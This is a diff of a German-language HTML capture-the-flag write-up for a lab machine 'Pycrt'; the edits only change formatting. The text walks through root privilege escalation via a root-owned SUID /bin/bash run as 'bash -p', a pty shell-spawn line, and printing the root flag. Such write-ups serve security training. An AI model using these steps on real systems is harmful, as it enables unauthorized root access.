-            <p class="comment">Dieser Abschnitt demonstriert die erfolgreiche Erlangung von Root-Rechten auf dem Zielsystem. Dies wurde durch die Ausnutzung einer SUID-gesetzten `/bin/bash`-Executable erreicht. Nachdem Zugriff als Benutzer `pycrtlake` erlangt wurde, konnte durch Aufruf von `/bin/bash -p` eine Shell mit effektiven Root-Privilegien gestartet werden.</p>
-            <p class="analysis">**Kurzbeschreibung:** Der Benutzer `pycrtlake` hatte Zugriff auf eine `/bin/bash`-Datei, bei der das SUID-Bit gesetzt war und die dem Benutzer `root` gehörte. Durch den Aufruf `bash -p` wurde verhindert, dass die Shell ihre effektiven Root-Rechte abgibt, was zu einer Root-Shell führte.</p>
+            <p class="comment">Dieser Abschnitt demonstriert die erfolgreiche Erlangung von Root-Rechten auf dem Zielsystem. Dies wurde durch die Ausnutzung einer SUID-gesetzten <span class="command">/bin/bash</span>-Executable erreicht. Nachdem Zugriff als Benutzer <span class="command">pycrtlake</span> erlangt wurde, konnte durch Aufruf von <span class="command">/bin/bash -p</span> eine Shell mit effektiven Root-Privilegien gestartet werden.</p>
+            <p class="analysis">**Kurzbeschreibung:** Der Benutzer <span class="command">pycrtlake</span> hatte Zugriff auf eine <span class="command">/bin/bash</span>-Datei, bei der das SUID-Bit gesetzt war und die dem Benutzer <span class="command">root</span> gehörte. Durch den Aufruf <span class="command">bash -p</span> wurde verhindert, dass die Shell ihre effektiven Root-Rechte abgibt, was zu einer Root-Shell führte.</p>
             <p class="evaluation">**Voraussetzungen:**
                 <ul>
-                    <li>Shell-Zugriff als Benutzer `pycrtlake`.</li>
-                    <li>Vorhandensein einer `/bin/bash`-Datei, die `root` gehört und bei der das SUID-Bit gesetzt ist.</li>
+                    <li>Shell-Zugriff als Benutzer <span class="command">pycrtlake</span>.</li>
+                    <li>Vorhandensein einer <span class="command">/bin/bash</span>-Datei, die <span class="command">root</span> gehört und bei der das SUID-Bit gesetzt ist.</li>
                 </ul>
             </p>
             <p class="recommendation">**Schritt-für-Schritt-Anleitung:**
                 <ol>
-                    <li>Nach Erhalt einer Shell als `pycrtlake` werden die Berechtigungen von `/bin/bash` überprüft (`ls -al /bin/bash`).</li>
-                    <li>Wenn das SUID-Bit gesetzt ist, wird `/bin/bash -p` ausgeführt.</li>
-                    <li>Der `id`-Befehl in der neuen Shell bestätigt `euid=0(root)`.</li>
+                    <li>Nach Erhalt einer Shell als <span class="command">pycrtlake</span> werden die Berechtigungen von <span class="command">/bin/bash</span> überprüft (<span class="command">ls -al /bin/bash</span>).</li>
+                    <li>Wenn das SUID-Bit gesetzt ist, wird <span class="command">/bin/bash -p</span> ausgeführt.</li>
+                    <li>Der <span class="command">id</span>-Befehl in der neuen Shell bestätigt <span class="command">euid=0(root)</span>.</li>
                 </ol>
             </p>
 <div class="code-block">
@@ -1476,7 +1502,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Befehl `id` wird in der Shell ausgeführt, die mit `/bin/bash -p` gestartet wurde. Die Ausgabe bestätigt `euid=0(root)`, was bedeutet, dass der aktuelle Prozess mit effektiven Root-Privilegien läuft.</p>
+<p class="analysis">**Analyse:** Der Befehl <span class="command">id</span> wird in der Shell ausgeführt, die mit <span class="command">/bin/bash -p</span> gestartet wurde. Die Ausgabe bestätigt <span class="password">euid=0(root)</span>, was bedeutet, dass der aktuelle Prozess mit effektiven Root-Privilegien läuft.</p>
 <p class="evaluation">**Erwartetes Ergebnis & Beweismittel:** Fantastisch, das Ziel ist erreicht! Wir haben nun vollen Root-Zugriff auf das System "Pycrt".</p>
 <div class="code-block">
     <div class="terminal">
@@ -1513,7 +1539,7 @@ drwxr-xr-x  8 root root 4096 Apr  5 07:57 .weechat
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Mit Root-Rechten wechselt der Pentester in das Home-Verzeichnis des Root-Benutzers (`cd ~`, was zu `/root` führt) und listet dessen Inhalt auf. Die Datei `root.txt` ist sichtbar.</p>
+<p class="analysis">**Analyse:** Mit Root-Rechten wechselt der Pentester in das Home-Verzeichnis des Root-Benutzers (<span class="command">cd ~</span>, was zu <span class="command">/root</span> führt) und listet dessen Inhalt auf. Die Datei <span class="command">root.txt</span> ist sichtbar.</p>
 <p class="evaluation">**Bewertung:** Standardvorgehen nach Erlangung von Root-Rechten zur Lokalisierung der Root-Flag.</p>
 <p class="recommendation">**Risikobewertung:** Der erfolgreiche Root-Zugriff stellt das höchstmögliche Risiko dar. Ein Angreifer hat die vollständige Kontrolle über das System.</p>
 <div class="code-block">
@@ -1525,7 +1551,7 @@ drwxr-xr-x  8 root root 4096 Apr  5 07:57 .weechat
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Inhalt von `root.txt` wird ausgegeben und enthüllt die Root-Flag: `flag{e80ecc46ca5e00bf8a51c47f0cc3e868}`.</p>
+<p class="analysis">**Analyse:** Der Inhalt von <span class="command">root.txt</span> wird ausgegeben und enthüllt die Root-Flag: <span class="password">flag{e80ecc46ca5e00bf8a51c47f0cc3e868}</span>.</p>
 <p class="evaluation">**Bewertung:** Mission erfüllt! Beide Flags wurden gefunden und das System wurde vollständig kompromittiert.</p>
         </section>
 
